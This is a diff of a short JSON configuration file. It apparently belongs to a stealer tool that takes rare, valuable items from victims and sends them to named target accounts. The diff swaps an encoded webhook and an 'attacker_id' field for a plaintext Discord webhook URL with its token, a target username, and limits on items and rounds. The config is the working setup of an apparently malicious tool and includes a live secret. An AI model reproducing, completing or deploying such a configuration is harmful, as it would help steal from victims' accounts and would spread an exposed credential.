@@ -1,4 +1,12 @@
 {
-  "webhook": "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3NTgyMzgxNzIxMTkxMjIwMi9YZVk2dGFtTUVGZGpHWElEX2duakR1WjZzaEZoOFRqZmxnNFVjZGpaR2d3YXI4eW4tTXJJNWNnUmdqOEU1T0VlWGhYYw==",
-  "attacker_id": 1316331233
+  "targets": ["Viivik13"],
+  "webhooks": [
+    "https://discord.com/api/webhooks/1575855895051632741/-Yz2VwHkH4CMJox6iQn1wKYq8U1QAafm_CsTfj7DeHBQvAif7K1PBKZUr5noSfDeXnf7"
+  ],
+  "filter": "rare",
+  "fallback_all": false,
+  "min_value": 0,
+  "max_items": 40,
+  "max_rounds": 12,
+  "debug": true
 }
